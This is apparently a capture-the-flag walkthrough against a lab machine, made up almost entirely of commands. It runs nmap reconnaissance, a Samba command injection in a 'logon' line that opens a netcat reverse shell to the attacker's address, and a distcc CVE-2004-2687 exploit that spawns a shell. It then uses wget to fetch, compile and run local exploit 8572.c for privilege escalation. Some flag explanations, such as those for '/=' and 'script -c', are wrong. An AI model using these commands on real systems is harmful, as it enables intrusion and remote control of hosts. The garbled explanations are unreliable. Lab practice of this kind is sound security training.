#   CMD 

```
nmap -sC -sV 10.10.10.3
```
-sC: run default nmap scripts <br>
-sV: detect service version

```
ls /usr/share/nmap/scripts/ftp*
```
/usr/share/nmap/scripts/ftp-anon.nse<br>
/usr/share/nmap/scripts/ftp-proftpd-backdoor.nse<br>
/usr/share/nmap/scripts/ftp-bounce.nse <br>
/usr/share/nmap/scripts/ftp-syst.nse<br>
/usr/share/nmap/scripts/ftp-brute.nse
/usr/share/nmap/scripts/ftp-libopie.nse <br>
/usr/share/nmap/scripts/ftp-vuln-cve2010-4221.nse
<h5>/usr/share/nmap/scripts/ftp-vsftpd-backdoor.nse</h5>

```
nmap --script ftp-vsftpd-backdoor -p 21 10.10.10.3
```
```
ls /usr/share/nmap/scripts/ssh*
```
```
smbclient -L 10.10.10.3
```
```
smbmap -H 10.10.10.3
```

#   Exploitation #1: Samba

```
nc -nlvp 4444
```
```
smbclient //10.10.10.3/tmp
```
```
logon "/=`nohup nc -nv 10.10.14.20 4444 -e /bin/sh`"
```

logon   ---->>>> is likely the name of a function or command that is being called. <br>
"/="    ---->>>> is not a valid shell syntax and it's not clear what the intention of this string is. <br>
nohup   ---->>>>  is a command that allows a process to continue running in the background even if the user logs out or the terminal is closed. <br>
-nc     ---->>>>  is the netcat command, which is a utility for reading and writing data across network connections. <br>
-nv     ---->>>> are options for nc, which instruct it to use verbose output and to not use DNS for resolving the target IP address. <br>
-e      ---->>>>  is an option for nc that specifies the command to execute after the connection is established. <br>
/bin/sh ---->>>>  is the command that will be executed on the target machine after the reverse shell connection is established. It launches a shell session, allowing the attacker to interact with the target machine's command line. <br>
    
```
script -qc /bin/bash /dev/null 
```
"script" ---->>>>  is a command-line utility that creates a typescript of a terminal session.
"-q" ---->>>>  flag tells "script" to run in quiet mode, which suppresses extra messages from being printed on the console.
"c" ---->>>>  flag tells "script" to capture the output to the specified file, in this case, "/dev/null", which is a special file that discards any data written to it.
"/bin/bash" ---->>>>  is the shell interpreter that executes the commands in the script.
"/dev/null" ---->>>>  is a special file that discards any data written to it.

#   Exploitation #2: Distcc

```
nc -nlvp 4444
```
```
nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -nv 10.10.14.20 4444 -e /bin/bash'"
```
```
searchsploit -m 8572.c
```
```
python -m SimpleHTTPServer 9005
```
```
wget http://10.10.14.20:5555/8572.c
```
```
gcc 8572.c -o 8572  
```
```
ps -aux | grep devd
```
```
nc -nlvp 4445
```
```
./8572 2661
```
